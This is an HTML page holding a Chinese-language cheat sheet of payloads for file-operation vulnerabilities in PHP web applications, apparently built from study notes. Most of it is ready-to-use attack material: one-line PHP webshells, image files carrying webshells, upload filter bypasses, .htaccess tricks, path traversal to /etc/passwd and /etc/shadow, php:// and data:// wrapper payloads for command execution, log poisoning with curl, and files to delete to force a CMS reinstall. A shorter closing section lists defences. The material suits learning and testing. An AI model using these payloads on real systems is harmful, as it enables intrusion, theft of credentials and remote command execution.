<div class="panel fade-in">
    <h2>📖 文件操作类漏洞 Payload 速查表</h2>
    <p>常用Payload汇总、绕过技巧、防御方案参考。内容基于《文件操作类漏洞学习笔记》。</p>

    <!-- 文件上传 -->
    <div class="cheat-section">
        <h3>1️⃣ 文件上传漏洞</h3>

        <h4>WebShell常用代码</h4>
        <ul class="payload-list">
            <li><code>&lt;?php @eval($_POST['cmd']); ?&gt;</code> - 一句话WebShell（POST）</li>
            <li><code>&lt;?php @system($_GET['cmd']); ?&gt;</code> - 命令执行WebShell（GET）</li>
            <li><code>&lt;?php @assert($_POST['cmd']); ?&gt;</code> - assert方式</li>
            <li><code>&lt;?php file_put_contents($_POST['f'], $_POST['c']); ?&gt;</code> - 文件写入马</li>
            <li><code>&lt;script language="php"&gt;@eval($_POST['cmd']);&lt;/script&gt;</code> - script标签</li>
        </ul>

        <h4>Content-Type 绕过</h4>
        <ul class="payload-list">
            <li><code>Content-Type: image/jpeg</code> - 改为JPEG类型</li>
            <li><code>Content-Type: image/png</code> - 改为PNG类型</li>
            <li>curl: <code>curl -F "file=@shell.php;type=image/jpeg" http://target/upload</code></li>
        </ul>

        <h4>扩展名绕过</h4>
        <ul class="payload-list">
            <li><code>shell.php5</code> / <code>shell.php7</code> / <code>shell.pht</code> - PHP其他后缀</li>
            <li><code>shell.Php</code> / <code>shell.PHP</code> - 大小写绕过</li>
            <li><code>shell.php.jpg</code> - 双扩展名（Apache解析漏洞）</li>
            <li><code>shell.php::$DATA</code> - NTFS ADS流（Windows）</li>
        </ul>

        <h4>文件头检测绕过（图片马）</h4>
        <ul class="payload-list">
            <li><code>GIF89a &lt;?php @system($_GET['cmd']); ?&gt;</code> - GIF图片马</li>
            <li><code>\xFF\xD8\xFF\xE0 &lt;?php @system($_GET['cmd']); ?&gt;</code> - JPEG图片马</li>
            <li><code>\x89PNG\r\n\x1a\n &lt;?php @system($_GET['cmd']); ?&gt;</code> - PNG图片马</li>
        </ul>

        <h4>.htaccess 绕过</h4>
        <ul class="payload-list">
            <li><code>AddType application/x-httpd-php .jpg .png .gif</code> - 图片按PHP解析</li>
            <li><code>&lt;FilesMatch "shell"&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code></li>
        </ul>
    </div>


<div class="cheat-section">
    <h3>2️⃣ 文件包含漏洞（LFI/RFI）</h3>

    <h4>路径遍历读取文件</h4>
    <ul class="payload-list">
        <li><code>../../../etc/passwd</code> - 读取Linux用户文件</li>
        <li><code>../../../etc/shadow</code> - 读取密码哈希</li>
        <li><code>../../../var/www/html/config.php</code> - 读取Web配置</li>
        <li><code>../../../../proc/self/environ</code> - 读取环境变量</li>
    </ul>

    <h4>php://filter 读取PHP源码</h4>
    <ul class="payload-list">
        <li><code>php://filter/convert.base64-encode/resource=config.php</code> - Base64编码读取</li>
        <li><code>php://filter/read=string.rot13/resource=file.txt</code> - ROT13编码读取</li>
    </ul>

    <h4>PHP封装协议利用</h4>
    <ul class="payload-list">
        <li><code>php://input</code> - POST数据执行（需 allow_url_include=On）</li>
        <li><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==</code> - data协议执行命令</li>
        <li><code>expect://id</code> - expect扩展命令执行</li>
        <li><code>zip://uploads/shell.zip%23shell.php</code> - zip协议包含</li>
        <li><code>phar://uploads/test.phar/test.txt</code> - phar协议包含</li>
    </ul>

    <h4>后缀追加绕过</h4>
    <ul class="payload-list">
        <li><code>../etc/passwd%00</code> - 空字节截断（PHP &lt; 5.3.4）</li>
        <li><code>../etc/passwd/././...[超长]/./</code> - 路径长度截断</li>
        <li><code>php://filter/.../resource=config</code> - 使用协议绕过</li>
        <li><code>../etc/passwd?</code> / <code>../etc/passwd%23</code> - 问号/井号截断</li>
    </ul>

    <h4>日志注入（Log Poisoning）</h4>
    <ul class="payload-list">
        <li><code>curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://target/</code> - User-Agent注入</li>
        <li>日志路径: <code>/var/log/apache2/access.log</code> / <code>/var/log/nginx/access.log</code></li>
    </ul>
</div>

<div class="cheat-section">
    <h3>3️⃣ 文件下载与删除漏洞</h3>
    <h4>文件下载</h4>
    <ul class="payload-list">
        <li><code>../../../etc/passwd</code> - Linux用户信息</li>
        <li><code>../../../etc/hosts</code> - 主机名解析</li>
        <li><code>../../../proc/net/tcp</code> - 网络连接信息</li>
    </ul>
    <h4>文件删除</h4>
    <ul class="payload-list">
        <li><code>../config.php</code> - 删除数据库配置</li>
        <li><code>../install.lock</code> - 重装CMS</li>
        <li><code>.htaccess</code> - 删除Apache配置</li>
    </ul>
</div>

<div class="cheat-section">
    <h3>4️⃣ 防御方案</h3>
    <h4>文件上传防御</h4>
    <ul class="payload-list">
        <li>✅ 使用白名单限制扩展名（仅.jpg .png .gif）</li>
        <li>✅ 用 finfo 检测文件真实类型</li>
        <li>✅ 上传文件重命名（时间戳+随机数）</li>
        <li>✅ 设置上传目录不可执行PHP</li>
        <li>✅ 用图片处理库重新压缩（清除注入代码）</li>
    </ul>
    <h4>文件包含防御</h4>
    <ul class="payload-list">
        <li>✅ 使用白名单限制可包含的文件</li>
        <li>✅ 关闭 allow_url_include</li>
        <li>✅ 用 realpath() 验证路径是否在允许范围内</li>
        <li>✅ 避免直接使用用户输入作为包含路径</li>
    </ul>
    <h4>文件下载/删除防御</h4>
    <ul class="payload-list">
        <li>✅ 使用白名单限制可下载/删除的文件</li>
        <li>✅ 用 realpath() 验证路径是否在允许范围内</li>
        <li>✅ 过滤 ../ 和 ..\\ 路径遍历字符</li>
        <li>✅ 最小权限原则</li>
    </ul>
</div>
</div>
